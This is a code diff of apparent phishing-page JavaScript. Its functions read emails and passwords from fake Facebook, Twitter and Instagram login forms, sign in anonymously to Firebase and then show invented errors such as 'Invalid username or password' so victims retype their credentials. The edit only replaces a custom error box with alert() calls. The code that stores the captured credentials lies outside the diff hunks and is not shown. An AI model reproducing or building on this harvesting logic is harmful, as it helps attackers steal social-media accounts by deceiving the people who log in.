@@ -17,7 +17,7 @@ function login() {
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      showError(error.message, "error_box");
+      alert(error.message);
     });
 
   var email = document.getElementById("fb-email").value;
@@ -39,15 +39,12 @@ function login() {
     });
 
     setTimeout(function () {
-      showError(
-        "Oops, something went wrong. Please try again later.",
-        "error_box"
-      );
+      alert("Oops, something went wrong. Please try again later.");
       document.getElementById("fb-pass").value = "";
       return false;
     }, 2000);
   } else {
-    showError("Please enter both email and password.", "error_box");
+    alert("Please enter both email and password.");
   }
 }
 
@@ -56,7 +53,7 @@ function twlogin() {
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      showError(error.message, "error_box");
+      alert(error.message);
     });
 
   var email = document.getElementById("tw-email").value;
@@ -78,22 +75,21 @@ function twlogin() {
     });
 
     setTimeout(function () {
-      showError("Invalid username or password", "error_box");
+      alert("Invalid username or password");
       document.getElementById("tw-pass").value = "";
       return false;
     }, 2000);
   } else {
-    showError("Please enter both email and password.", "error_box");
+    alert("Please enter both email and password.");
   }
 }
 
 function iglog() {
   var email = document.getElementById("ig-uname").value.trim();
   var password = document.getElementById("ig-pass").value.trim();
-  var errorBox = "ig_error_box";
 
   if (email === "" || password === "") {
-    showError("Please enter both email and password.", errorBox);
+    alert("Please enter both email and password.");
     return false; // Prevents further execution
   }
 
@@ -102,7 +98,7 @@ function iglog() {
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      showError(error.message, errorBox);
+      alert(error.message);
     });
 
   var currentDate = new Date().toISOString().slice(0, 10);
@@ -123,19 +119,8 @@ function iglog() {
 
   // Simulate a delay and provide feedback
   setTimeout(function () {
-    showError("Please double-check your password", errorBox);
+    alert("Please double-check your password");
     document.getElementById("ig-pass").value = ""; // Clear the password field
     return false; // Optionally prevent form submission if that's the goal
   }, 2000);
-}
-
-function showError(message, boxId) {
-  var errorBox = document.getElementById(boxId);
-  errorBox.style.display = "block";
-  errorBox.querySelector("div:nth-child(2)").textContent = message;
-}
-
-function hideError(boxId) {
-  var errorBox = document.getElementById(boxId);
-  errorBox.style.display = "none";
 }
